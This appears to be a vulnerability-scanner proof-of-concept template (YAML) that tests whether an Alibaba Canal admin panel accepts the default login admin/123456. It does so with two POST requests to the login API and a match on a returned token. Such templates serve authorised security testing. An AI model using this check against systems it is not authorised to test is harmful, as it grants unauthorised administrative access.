id: poc-yaml-alibaba-canal-default-password
info:
  name: Alibaba Canal 默认密码漏洞
  severity: medium
  tags:
  - 访问控制错误
  finger: Alibaba Canal
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /api/v1/user/login
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "com.alibaba.otter.canal.admin.controller.UserController.login")
  output: []
- method: POST
  path: /api/v1/user/login
  headers:
    Content-Type: application/json
  data: '{"username":"admin","password":"123456"}'
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "{\"code\":20000,") && contains(body,
    "\"data\":{\"token\"")
  output: []
